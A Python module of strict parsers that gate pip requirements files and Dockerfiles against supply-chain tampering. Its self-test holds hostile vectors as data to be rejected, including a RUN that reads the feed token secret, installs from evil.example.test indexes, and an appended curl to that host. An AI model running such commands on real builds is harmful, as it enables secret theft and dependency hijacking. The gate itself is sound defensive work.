"""Strict parsers shared by pin_check.py (offline) and provenance.py (online).

Both gates must see exactly what pip and BuildKit act on, so anything they would honour
that these parsers do not understand is an error, never a skipped line.

Requirements files (`requirements*.txt` under broker/), after joining `\\` continuations:
  * blank lines and `#` comments;
  * `name==version` followed by one or more `--hash=sha256:<64 lowercase hex>`.
  Everything else is rejected: extras, direct URLs, markers, other operators, option lines
  (`-r`, `-c`, `-e`, `--index-url`, `--extra-index-url`, `--find-links`, ...), other hash
  algorithms or spellings, uppercase digests.

Dockerfiles (`Dockerfile`, `Dockerfile.*`, `*.Dockerfile`, `Containerfile*`), build
context `broker/`:
  * no parser directives (`# syntax=` would run an unpinned BuildKit frontend);
  * no `ADD`, `ONBUILD`, or `COPY --from=` anything but an earlier stage;
  * no pip configuration (`PIP_*` other than the build arg `PIP_SOURCE`, `pip.conf`);
  * `RUN` flags only in the two forms below;
  * wheels are fetched only in a named stage, by exactly
      RUN --mount=type=secret,id=cfs_feed_token,required=false \\
          --mount=type=tmpfs,target=/run/cfs-auth python3 <pip-fetch.py> <path>
    where `<pip-fetch.py>` is a COPY of tools/pip-fetch.py and `<path>` a COPY of one
    checked requirements file (the token-holding stage; see tools/pip-fetch.py);
  * every Python package install is exactly
      RUN --mount=type=bind,from=<stage>,source=/wheels,target=/opt/wheels \\
          pip install --no-cache-dir --no-deps --require-hashes --only-binary=:all: \\
          --no-index --find-links /opt/wheels -r <path>
    where `<stage>` is an earlier stage on the same base image that fetched that same
    requirements file, so the installed interpreter is the one the wheels were chosen for.

What the gate guarantees, and what it doesn't (security review rounds 9 and 9b):
  * guaranteed: the CFS token is mounted only into the one templated fetch RUN, and the
    canonical install installs exactly the checked requirements file, by hash, offline;
  * not guaranteed: that no other RUN installs something. A RUN runs arbitrary shell, so
    spotting other installers (`pip`, `uv`, ...) is a heuristic that catches mistakes, not
    an attacker who spells the command indirectly. Dockerfile changes are reviewed code.
"""

from __future__ import annotations

import posixpath
import re
import shlex
from dataclasses import dataclass
from pathlib import Path

BROKER = Path(__file__).resolve().parents[1]

NAME = r"[A-Za-z0-9](?:[A-Za-z0-9._-]*[A-Za-z0-9])?"
PIN_RE = re.compile(rf"^({NAME})==([0-9][0-9A-Za-z.+!-]*)$")
HASH_RE = re.compile(r"^--hash=sha256:([0-9a-f]{64})$")
REQ_NAME_RE = re.compile(r"^requirements[A-Za-z0-9_.-]*\.txt$")
FROM_RE = re.compile(r"^(?:--platform=\S+\s+)?(\S+)(?:\s+AS\s+(\S+))?\s*$", re.I)
PINNED_RE = re.compile(r"^[\w./:-]+@sha256:[0-9a-f]{64}$")
DIRECTIVE_RE = re.compile(r"^\s*#\s*(syntax|escape)\s*=", re.I)
INSTALLER_RE = re.compile(r"(?<![\w-])(pip[0-9.]*|uv|pipx|poetry|pdm|easy_install|conda|mamba|micromamba)(?![\w-])")
PIP_CONFIG_RE = re.compile(r"\bPIP_(?!SOURCE\b)[A-Z_]+|pip\.conf|pydistutils")
CANONICAL = ["pip", "install", "--no-cache-dir", "--no-deps", "--require-hashes", "--only-binary=:all:",
             "--no-index", "--find-links", "/opt/wheels", "-r"]
FETCH_FLAGS = ["--mount=type=secret,id=cfs_feed_token,required=false", "--mount=type=tmpfs,target=/run/cfs-auth"]
FETCH_SCRIPT = BROKER / "tools" / "pip-fetch.py"
BIND_RE = re.compile(r"^--mount=type=bind,from=([A-Za-z0-9_.-]+),source=/wheels,target=/opt/wheels$")
CONTROL = {"&&", "||", ";", "|", "&", ";;", "(", ")"}


class SupplyChainError(ValueError):
    pass


def norm(name: str) -> str:
    return re.sub(r"[-_.]+", "-", name).lower()


def rel(p: Path) -> str:
    try:
        return str(p.relative_to(BROKER.parent))
    except ValueError:
        return p.name


def _excluded(p: Path) -> bool:
    return ".work" in p.parts or "__pycache__" in p.parts


def requirement_files() -> list[Path]:
    return sorted(p for p in BROKER.rglob("requirements*.txt") if not _excluded(p))


def dockerfiles() -> list[Path]:
    pats = ("Dockerfile", "Dockerfile.*", "*.Dockerfile", "Containerfile", "Containerfile.*", "*.Containerfile")
    return sorted({p for pat in pats for p in BROKER.rglob(pat) if p.is_file() and not _excluded(p)})


def parse_requirements(path: Path) -> list[tuple[int, str, str, list[str]]]:
    """[(line, normalised name, version, [sha256, ...])]. Raises on anything unexpected."""
    pins, seen, buf, start = [], set(), "", 0
    lines = path.read_text().splitlines() + [""]
    for n, raw in enumerate(lines, 1):
        if buf and n == len(lines):
            raise SupplyChainError(f"{rel(path)}:{start}: dangling continuation at end of file")
        stripped = raw.strip()
        if not buf and (not stripped or stripped.startswith("#")):
            continue
        if not buf:
            start = n
        line = re.sub(r"\s+#.*$", "", raw)
        if line.rstrip().endswith("\\"):
            buf += line.rstrip()[:-1] + " "
            continue
        buf += line
        tokens, buf = buf.split(), ""
        if not tokens:
            raise SupplyChainError(f"{rel(path)}:{start}: dangling continuation")
        m = PIN_RE.match(tokens[0])
        if not m:
            raise SupplyChainError(f"{rel(path)}:{start}: not a plain `name==version` pin: {tokens[0][:60]!r}")
        hashes = []
        for t in tokens[1:]:
            h = HASH_RE.match(t)
            if not h:
                raise SupplyChainError(f"{rel(path)}:{start}: unexpected token {t[:60]!r} "
                                       "(only --hash=sha256:<64 lowercase hex> may follow a pin)")
            hashes.append(h.group(1))
        if not hashes:
            raise SupplyChainError(f"{rel(path)}:{start}: {m.group(1)} has no --hash")
        name = norm(m.group(1))
        if name in seen:
            raise SupplyChainError(f"{rel(path)}:{start}: {name} is pinned twice")
        seen.add(name)
        pins.append((start, name, m.group(2), hashes))
    return pins


OPCODES = frozenset({"FROM", "RUN", "COPY", "ARG", "ENV", "USER", "WORKDIR", "CMD", "ENTRYPOINT", "EXPOSE",
                     "LABEL", "STOPSIGNAL", "HEALTHCHECK", "VOLUME"})


def _instructions(path: Path):
    """Yield (line, INSTRUCTION, args) with continuations joined exactly as BuildKit joins
    them. Anything the two could read differently is an error, never a guess (security
    review rounds 9 and 9b):
      * the file is read as bytes and must be printable ASCII plus tab and `\\n`; `\\r` only
        directly before `\\n`; no other control or non-ASCII character (U+00A0, U+0085, ...);
      * a backslash followed by whitespace at the end of a line is refused (BuildKit would
        still continue; we don't emulate it);
      * continuation lines are appended as they are: no added space, leading whitespace kept;
      * the keyword ends at any whitespace; unknown keywords, SHELL and heredocs are refused."""
    data = path.read_bytes()
    if re.search(rb"\r(?!\n)", data):
        raise SupplyChainError(f"{rel(path)}: carriage return not followed by a newline")
    data = data.replace(b"\r\n", b"\n")
    bad = re.search(rb"[^\x20-\x7e\t\n]", data)
    if bad:
        line = data[:bad.start()].count(b"\n") + 1
        raise SupplyChainError(f"{rel(path)}:{line}: only printable ASCII, tab and newline are allowed "
                               f"(found {bad.group(0)!r})")
    text = data.decode("ascii")
    buf, start = None, 0
    for n, raw in enumerate(text.split("\n") + [""], 1):
        if DIRECTIVE_RE.match(raw):
            raise SupplyChainError(f"{rel(path)}:{n}: parser directives are not allowed "
                                   "(`# syntax=` runs an unpinned BuildKit frontend)")
        if re.search(r"\\[ \t]+$", raw):
            raise SupplyChainError(f"{rel(path)}:{n}: whitespace after a line-continuation backslash")
        s = raw.strip()
        if s.startswith("#") or (buf is not None and not s):
            continue
        if buf is None:
            if not s:
                continue
            start, buf = n, ""
            raw = raw.lstrip()
        if raw.endswith("\\"):
            buf += raw[:-1]
            continue
        buf += raw
        m = re.match(r"(\S+)\s*(.*)$", buf, re.S)
        buf = None
        word, args = m.group(1).upper(), m.group(2).strip()
        if word not in OPCODES:
            raise SupplyChainError(f"{rel(path)}:{start}: unknown or disallowed instruction {word[:20]!r}")
        if word in ("RUN", "COPY") and "<<" in args:
            raise SupplyChainError(f"{rel(path)}:{start}: heredocs are not allowed (they cannot be checked)")
        yield start, word, args
    if buf is not None:
        raise SupplyChainError(f"{rel(path)}:{start}: dangling line continuation at end of file")


@dataclass
class Install:
    dockerfile: Path
    line: int
    requirements: Path
    base: str


def _commands(script: str) -> list[list[str]]:
    lex = shlex.shlex(script, posix=True, punctuation_chars=True)
    lex.whitespace_split = True
    cmds, cur = [], []
    for tok in lex:
        if tok in CONTROL:
            if cur:
                cmds.append(cur)
            cur = []
        else:
            cur.append(tok)
    if cur:
        cmds.append(cur)
    return cmds


def _resolve_copy_src(df: Path, src: str, script: bool = False) -> Path | None:
    """A COPY source in the build context (broker/, for every image with Python installs)."""
    if ".." in Path(src).parts or re.search(r"[*?\[$]", src):
        return None
    p = (BROKER / src).resolve()
    if script:
        return p if p == FETCH_SCRIPT.resolve() else None
    if not REQ_NAME_RE.match(Path(src).name):
        return None
    return p if p.is_file() else None


def _split_flags(args: str) -> tuple[list[str], str]:
    flags, rest = [], args
    while rest.startswith("--"):
        tok, _, rest = rest.partition(" ")
        flags.append(tok)
        rest = rest.lstrip()
    return flags, rest


WHEELS_DIR = "/opt/pipfetch/"
FETCH_SCRIPT_DEST = WHEELS_DIR + "pip-fetch.py"
# COPY destinations and `-r` paths the gate tracks: plain absolute paths only, so BuildKit
# (which expands $VAR in COPY from ENV/ARG) and the RUN shell resolve them identically.
SAFE_PATH = re.compile(r"^/[A-Za-z0-9_./-]+$")
PIP_TOKEN_RE = re.compile(r"PIP_(?!SOURCE$)|pip\.conf|pydistutils", re.I)


def _shell_tokens(text: str) -> list[str]:
    try:
        return shlex.split(text, posix=True)
    except ValueError:
        return [text]


def scan_dockerfile(df: Path, image_refs: set[str]) -> tuple[list[Install], list[str]]:
    """Installs found and errors (as `path:line: message`).

    A `wheels*` stage, the only place the CFS token is mounted, must be exactly:
    FROM <pinned, registered image> AS wheels*; any of `ARG PIP_SOURCE`, `USER root`,
    `COPY tools/pip-fetch.py /opt/pipfetch/pip-fetch.py`, `COPY <checked requirements
    file> /opt/pipfetch/<its name>`; then, last and only, the fetch RUN. Nothing else can
    run code before or beside the token (security review round 9).
    An install RUN must directly follow the COPY of its requirements file, so nothing can
    replace the file in between, and the canonical install must be its first command."""
    errors: list[str] = []
    installs: list[Install] = []
    stages: dict[str, str] = {}
    fetched: dict[str, set[Path]] = {}
    stage_copies: dict[str, dict[str, Path | str | None]] = {}
    copies: dict[str, Path | str | None] = {}
    base, stage, wheels, wheels_done, prev = "", None, False, False, ("", "")
    loc = rel(df)
    try:
        instrs = list(_instructions(df))
    except SupplyChainError as e:
        return [], [str(e)]

    def err(n: int, msg: str) -> None:
        errors.append(f"{loc}:{n}: {msg}")

    for n, op, args in instrs:
        if PIP_CONFIG_RE.search(args) or (op in ("ENV", "ARG", "RUN", "COPY")
                                          and any(PIP_TOKEN_RE.search(t) for t in _shell_tokens(args))):
            err(n, "pip configuration in a Dockerfile is not allowed")
        if wheels and op != "FROM":
            if wheels_done:
                err(n, "nothing may follow the fetch RUN in a wheels stage")
            elif op == "ARG" and args == "PIP_SOURCE" or op == "USER" and args == "root":
                pass
            elif op == "COPY":
                parts = args.split()
                ok = len(parts) == 2 and (
                    (parts == ["tools/pip-fetch.py", FETCH_SCRIPT_DEST])
                    or (isinstance(_resolve_copy_src(df, parts[0]), Path)
                        and parts[1] == WHEELS_DIR + Path(parts[0]).name))
                if not ok:
                    err(n, "a wheels stage may only COPY tools/pip-fetch.py and requirements files to "
                           "/opt/pipfetch/<same name>")
                else:
                    copies[parts[1]] = "script" if parts[1] == FETCH_SCRIPT_DEST else _resolve_copy_src(df, parts[0])
            elif op == "RUN":
                flags, script = _split_flags(args)
                tokens = _shell_tokens(script)
                if (flags != FETCH_FLAGS or len(tokens) != 4 or tokens[:3] != ["python3", "-I", FETCH_SCRIPT_DEST]
                        or copies.get(FETCH_SCRIPT_DEST) != "script" or not isinstance(copies.get(tokens[3]), Path)
                        or any(c in script for c in ";&|`$()<>\n")):
                    err(n, "the only RUN in a wheels stage is exactly `" + " ".join(FETCH_FLAGS)
                        + f" python3 -I {FETCH_SCRIPT_DEST} <COPY of a requirements file>`")
                else:
                    fetched.setdefault(stage, set()).add(copies[tokens[3]])
                    wheels_done = True
            else:
                err(n, f"{op} is not allowed in a wheels stage")
            prev = (op, args)
            continue
        if op == "FROM":
            m = FROM_RE.match(args)
            if not m:
                err(n, f"unparsed FROM {args!r}")
                continue
            image, alias = m.group(1), m.group(2)
            if image.lower() in stages:
                if image.lower().startswith("wheels"):
                    err(n, "a stage may not build on a wheels stage")
                base = stages[image.lower()]
                copies = dict(stage_copies.get(image.lower(), {}))
            else:
                base, copies = image, {}
                if not PINNED_RE.match(image):
                    err(n, f"base image {image!r} is not pinned by digest")
                elif image not in image_refs:
                    err(n, f"base image {image!r} is not in broker/deps.json")
            stage = alias.lower() if alias else None
            wheels, wheels_done = bool(stage and stage.startswith("wheels")), False
            if wheels and image.lower() in stages:
                err(n, "a wheels stage must start from a pinned image, not another stage")
            if stage:
                stages[stage] = base
                stage_copies[stage] = copies
        elif op == "COPY":
            parts = args.split()
            flags = [p for p in parts if p.startswith("--")]
            rest = [p for p in parts if not p.startswith("--")]
            for f in flags:
                if f.lower().startswith("--from=") and f.split("=", 1)[1].lower() not in stages:
                    err(n, f"COPY {f} must name an earlier build stage")
            for dest in list(copies):
                if rest and (dest == rest[-1] or dest.startswith(rest[-1].rstrip("/") + "/")
                             or posixpath.normpath(rest[-1]) == posixpath.normpath(dest)):
                    copies.pop(dest)  # anything a later COPY may overwrite is no longer tracked
            if not flags and len(rest) == 2 and posixpath.normpath(rest[1]) == rest[1] and SAFE_PATH.match(rest[1]):
                copies[rest[1]] = _resolve_copy_src(df, rest[0])
        elif op == "RUN":
            if args.startswith("["):
                err(n, "exec-form RUN is not allowed (it cannot be checked)")
                prev = (op, args)
                continue
            flags, script = _split_flags(args)
            try:
                cmds = _commands(script)
            except ValueError as e:
                err(n, f"cannot parse RUN: {e}")
                prev = (op, args)
                continue
            if flags == FETCH_FLAGS:
                err(n, "the secret mount is only allowed in a wheels stage")
                prev = (op, args)
                continue
            bind = BIND_RE.match(flags[0]) if len(flags) == 1 else None
            if flags and bind is None:
                err(n, "RUN flags are allowed only in the wheels fetch and install forms")
            for i, cmd in enumerate(cmds):
                if cmd[:-1] == CANONICAL:
                    target = copies.get(cmd[-1])
                    src = bind.group(1).lower() if bind else None
                    copied_now = prev[0] == "COPY" and prev[1].split()[-1:] == [cmd[-1]]
                    first = re.split(r"&&|\|\||[;|&\n]", script, maxsplit=1)[0]
                    if not SAFE_PATH.match(cmd[-1]) or re.search(r"[$'\"\\`]", first):
                        err(n, "the install command must be plain text: no $, quotes, backslashes or backticks")
                    elif i != 0 or not copied_now:
                        err(n, "the install must be the first command of the RUN directly after the COPY of "
                               "its requirements file")
                    elif not isinstance(target, Path):
                        err(n, f"-r {cmd[-1]} is not the destination of a COPY of one checked requirements*.txt file")
                    elif src is None or src not in stages or target not in fetched.get(src, set()):
                        err(n, f"install must bind /wheels from an earlier stage that fetched {rel(target)}")
                    elif stages[src] != base:
                        err(n, f"wheels stage {src} has a different base image")
                    else:
                        installs.append(Install(df, n, target, base))
                elif any(INSTALLER_RE.search(t) for t in cmd):
                    err(n, f"Python package install must be exactly `{' '.join(CANONICAL)} <path>`: "
                           f"{' '.join(cmd)[:120]!r}")
            if bind is not None and not (cmds and cmds[0][:-1] == CANONICAL):
                err(n, "a wheels bind mount is only for the canonical install")
        prev = (op, args)
    return installs, errors


def verifier_base() -> str:
    """The interpreter the provenance verifier runs on (tools/attest/Dockerfile)."""
    for _, op, args in _instructions(BROKER / "tools" / "attest" / "Dockerfile"):
        if op == "FROM":
            return args.split()[0]
    raise SupplyChainError("tools/attest/Dockerfile has no FROM")


def install_targets(image_refs: set[str]) -> tuple[dict[Path, set[str]], list[str]]:
    """{requirements file: {base images it is installed into}}, errors."""
    targets: dict[Path, set[str]] = {}
    errors: list[str] = []
    for df in dockerfiles():
        installs, errs = scan_dockerfile(df, image_refs)
        errors += errs
        for i in installs:
            targets.setdefault(i.requirements, set()).add(i.base)
    return targets, errors


def self_test() -> list[str]:
    """Every form pip or BuildKit would act on but the gates must not let through
    (security review 20261104-broker-dependency-provenance, alerts 1, 2 and 4)."""
    import tempfile

    h = "a" * 64
    good = "b" * 64
    req_bad = [
        f"pkg[x]==1.0 --hash=sha256:{h}",
        f"pkg == 1.0 --hash=sha256:{h}",
        f"pkg @ https://evil.example.test/pkg-1.0-py3-none-any.whl --hash=sha256:{h}",
        "-r other.txt", "-c constraints.txt", "-e .",
        "--index-url https://evil.example.test/simple",
        "--extra-index-url https://evil.example.test/simple",
        "--find-links https://evil.example.test/",
        "-i https://evil.example.test/simple",
        f"--hash=sha256:{h}",
        f"pkg==1.0 --hash=sha512:{h}{h}",
        f"pkg==1.0 --hash=sha256:{h.upper()}",
        f"pkg==1.0 --hash sha256:{h}",
        f"pkg==1.0 --hash=sha256:{h} --hash=sha384:{h[:48]}{h[:48]}",
        f"pkg==1.0 ; python_version > '3' --hash=sha256:{h}",
        f"pkg>=1.0 --hash=sha256:{h}",
        f"pkg===1.0 --hash=sha256:{h}",
        "pkg==1.0",
        f"pkg==1.0 \\\n    --hash=sha256:{h} \\",
        f"pkg==1.0 --hash=sha256:{h}\npkg==1.0 --hash=sha256:{good}",
        f"pkg==1.0 --hash=sha256:{h} --no-binary=:all:",
    ]
    req_good = [
        f"pkg==1.0 --hash=sha256:{h}",
        f"# comment\npkg==1.0 \\\n    --hash=sha256:{h} \\\n    --hash=sha256:{good}\n    # via other\n",
        f"Pkg.Name_x==2.0rc1 --hash=sha256:{h}  # trailing comment",
    ]
    ref = f"python:3.13-slim-trixie@sha256:{h}"
    ref2 = f"debian:trixie-slim@sha256:{good}"
    canon = " ".join(CANONICAL)
    fetch = " ".join(FETCH_FLAGS)
    bind = "--mount=type=bind,from=wheels,source=/wheels,target=/opt/wheels"
    wheels = (f"FROM {ref} AS wheels\nARG PIP_SOURCE\nUSER root\nCOPY tools/pip-fetch.py /opt/pipfetch/pip-fetch.py\n"
              f"COPY requirements.txt /opt/pipfetch/requirements.txt\n"
              f"RUN {fetch} python3 -I /opt/pipfetch/pip-fetch.py /opt/pipfetch/requirements.txt\n")
    head = wheels + f"FROM {ref} AS base\nCOPY requirements.txt /r.txt\n"
    install = f"RUN {bind} {canon} /r.txt"
    wheels_hook = wheels.replace("USER root\n", "ENV PYTHONPATH=/opt/hook\nRUN mkdir -p /opt/hook\n")
    df_bad = [
        "# syntax=docker/dockerfile:1\n" + head + install,
        "#escape=`\n" + head,
        # Review round 9: BuildKit ends the keyword at any whitespace; so must the gate.
        head + install + "\nRUN\t--mount=type=secret,id=cfs_feed_token,required=false sh -c 'cat /run/secrets/cfs_feed_token'",
        head + install + "\nENV\tPIP_INDEX_URL=https://evil.example.test/simple",
        head + install + "\nFROM\tpython:latest",
        head + install + "\nRUN\x0bpip install evilpkg",
        head + install + "\nRUN\x0cpip install evilpkg",
        head + install + "\nRUN <<EOF\npip install evilpkg\nEOF",
        head + install + "\nSHELL [\"python3\", \"-c\"]",
        head + install + "\nMAINTAINER x",
        # Review round 9: nothing else runs in a wheels stage, beside or before the token.
        wheels_hook + f"FROM {ref} AS base\nCOPY requirements.txt /r.txt\n" + install,
        wheels.replace("USER root\n", "RUN cp /bin/true /opt/pipfetch/pip-fetch.py\n") + f"FROM {ref} AS base\n",
        wheels.replace("COPY tools/pip-fetch.py /opt/pipfetch/pip-fetch.py\n",
                       "COPY tools/pip-fetch.py /opt/pipfetch/pip-fetch.py\nCOPY tools/pin_check.py /opt/pipfetch//pip-fetch.py\n")
        + f"FROM {ref} AS base\n",
        wheels.replace("python3 -I", "python3") + f"FROM {ref} AS base\n",
        wheels + "RUN true\n" + f"FROM {ref} AS base\n",
        wheels + f"FROM wheels AS base\nCOPY requirements.txt /r.txt\n" + install,
        f"FROM {ref} AS base\nRUN {fetch} python3 -I /opt/pipfetch/pip-fetch.py /opt/pipfetch/requirements.txt\n",
        # Review round 9: the checked file must be the installed file.
        head + "RUN cp /etc/hostname /r.txt\n" + install,
        head + "COPY requirements-test.txt /r.txt\n" + install.replace("/r.txt", "/x.txt"),
        head + "COPY requirements-test.txt /./r.txt\n" + install,
        head + f"RUN {bind} true && {canon} /r.txt",
        head + f"RUN {bind} export P\"IP_\"REQUIREMENT=/e.txt && {canon} /r.txt",
        head + f"RUN {bind} PIP_REQUIREMENT=/e.txt {canon} /r.txt",
        # Review round 9b: continuation lexing must match BuildKit, or fail closed.
        head + install + "\nCMD echo hi \\\u00a0\nRUN --mount=type=secret,id=cfs_feed_token,required=false true",
        head + install + "\nCMD echo hi \\\u0085\nRUN --mount=type=secret,id=cfs_feed_token,required=false true",
        head + install + "\nCMD echo hi \\\r \nRUN --mount=type=secret,id=cfs_feed_token,required=false true",
        head + install + "\nCMD echo hi \\ \nRUN --mount=type=secret,id=cfs_feed_token,required=false true",
        head + install + "\nCMD echo hi\rRUN true",
        head + install + "\nRUN p\\\nip install evilpkg",
        head.replace("COPY requirements.txt /r.txt\n", "COPY requirements.txt $HOME/r.txt\n")
        + f"RUN {bind} {canon} $HOME/r.txt",
        head + f"RUN {bind} {canon} \"/r.txt\"",
        head + "ADD https://evil.example.test/x /x",
        head + f"COPY --from=other@sha256:{h} /x /x",
        head + f"RUN --mount=type=bind,from=other@sha256:{h},target=/m true",
        head + f"RUN --mount=type=bind,from=other@sha256:{h},source=/wheels,target=/opt/wheels {canon} /r.txt",
        head + "RUN --network=host true",
        head + f"RUN {bind} true",
        head + f"RUN {canon} /r.txt",
        head + "RUN pip install --no-cache-dir --no-deps --require-hashes --only-binary=:all: -r /r.txt",
        head + "RUN pip install --require-hashes -r /r.txt",
        head + "RUN pip \\\n install --require-hashes -r /r.txt",
        head + f"RUN {bind} {canon} /r.txt --index-url https://evil.example.test/simple",
        head + f"RUN {bind} {canon} /elsewhere.txt",
        head + "COPY requirements-test.txt /t.txt\n" + f"RUN {bind} {canon} /t.txt",
        head.replace(f"FROM {ref} AS base", f"FROM {ref2} AS base") + install,
        head.replace("required=false", "required=true") + install,
        head.replace("pip-fetch.py /opt/pipfetch/requirements.txt\n",
                     "pip-fetch.py /opt/pipfetch/requirements.txt && curl https://evil.example.test/\n") + install,
        head.replace("COPY tools/pip-fetch.py", "COPY tools/pin_check.py") + install,
        head.replace(f"FROM {ref} AS wheels", f"FROM {ref}") + install,
        head + "RUN uv pip install pkg",
        head + "RUN python3 -m pip install pkg",
        head + "RUN sh -c 'pip install pkg'",
        head + "RUN true && pip3.13 install pkg",
        head + "ENV PIP_INDEX_URL=https://evil.example.test/simple",
        head + "ARG PIP_EXTRA_INDEX_URL",
        head + "COPY pip.conf /etc/pip.conf",
        head + 'RUN ["pip", "install", "pkg"]',
        head + "ONBUILD RUN true",
        "FROM python:3.13-slim-trixie\n",
        f"FROM unregistered@sha256:{h}\n",
    ]
    df_good = [
        head + install + " \\\n && apt-get install -y python3-pip\nFROM base AS t\nCOPY --from=base /x /y",
    ]
    failures = []
    with tempfile.TemporaryDirectory() as d:
        root = Path(d)
        (root / "requirements.txt").write_text(f"pkg==1.0 --hash=sha256:{h}\n")
        for i, text in enumerate(req_bad + req_good):
            p = root / f"requirements-{i}.txt"
            p.write_text(text + "\n")
            try:
                parse_requirements(p)
                ok = True
            except SupplyChainError:
                ok = False
            if ok != (text in req_good):
                failures.append(f"requirements vector {'accepted' if ok else 'rejected'}: {text!r}")
        for i, text in enumerate(df_bad + df_good):
            p = root / f"Dockerfile.{i}"
            p.write_text(text + "\n")
            installs, errors = scan_dockerfile(p, {ref, ref2})
            if (not errors) != (text in df_good) or (text in df_good and len(installs) != 1):
                failures.append(f"Dockerfile vector {'accepted' if not errors else 'rejected'}: {text!r} {errors}")
    return failures
